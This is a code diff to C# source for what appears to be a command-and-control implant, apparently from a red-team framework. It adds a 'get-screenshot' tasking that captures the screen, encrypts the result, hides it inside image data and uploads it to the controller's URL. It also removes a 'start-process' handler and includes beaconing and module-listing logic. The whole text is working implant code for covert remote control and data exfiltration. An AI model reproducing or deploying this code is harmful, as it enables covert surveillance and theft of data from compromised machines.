@@ -377,7 +377,7 @@ public class Program
 			System.Array.Copy(cmdoutput, 0, ImageBytesFull, imgBytes.Length + BytePadding.Length, cmdoutput.Length);
 			return ImageBytesFull;
 		}
-	}	
+	}
 	static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
 	{
 		UrlGen.Init(stringURLS, RandomURI, baseURL);
@@ -389,7 +389,6 @@ public class Program
 		{
 			beacontime = Parse_Beacon_Time(imch.Groups["t"].Value, imch.Groups["u"].Value);
 		}
-	
 		var strOutput = new StringWriter();
 		Console.SetOut(strOutput);
 		var exitvt = new ManualResetEvent(false);
@@ -475,31 +474,28 @@ public class Program
 							}
 							continue;
 						}
+						else if (cmd.ToLower().StartsWith("get-screenshot"))
+						{
+							var sHot = rAsm("run-exe Core.Program Core get-screenshot");
+							var eTaskId = Encryption(Key, taskId);
+							var dcoutput = Encryption(Key, strOutput.ToString(), true);
+							var doutputBytes = System.Convert.FromBase64String(dcoutput);
+							var dsendBytes = ImgGen.GetImgData(doutputBytes);
+							GetWebRequest(eTaskId).UploadData(UrlGen.GenerateUrl(), dsendBytes);
+							var sbc = strOutput.GetStringBuilder();
+							sbc.Remove(0, sbc.Length);
+							continue;
+						}
 						else if (cmd.ToLower().StartsWith("listmodules"))
 						{
 							var appd = AppDomain.CurrentDomain.GetAssemblies();
 							output.AppendLine("[+] Modules loaded:").AppendLine("");
 							foreach (var ass in appd)
-								output.AppendLine(ass.FullName.ToString());
+							output.AppendLine(ass.FullName.ToString());
 						}
 						else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
 						{
 							output.AppendLine(rAsm(cmd));
-						}
-						else if (cmd.ToLower().StartsWith("start-process"))
-						{
-							var proc = cmd.Replace("'", "").Replace("\"", "");
-							var pstart = Regex.Replace(proc, "start-process ", "", RegexOptions.IgnoreCase);
-							pstart = Regex.Replace(pstart, "-argumentlist(.*)", "", RegexOptions.IgnoreCase);
-							var args = Regex.Replace(proc, "(.*)argumentlist ", "", RegexOptions.IgnoreCase);
-							var p = new Process();
-							p.StartInfo.UseShellExecute = false;
-							p.StartInfo.RedirectStandardOutput = p.StartInfo.RedirectStandardError = p.StartInfo.CreateNoWindow = true;
-							p.StartInfo.FileName = pstart;
-							p.StartInfo.Arguments = args;
-							p.Start();
-							output.AppendLine(p.StandardOutput.ReadToEnd()).AppendLine(p.StandardError.ReadToEnd());
-							p.WaitForExit();
 						}
 						else if (cmd.ToLower().StartsWith("setbeacon") || cmd.ToLower().StartsWith("beacon"))
 						{
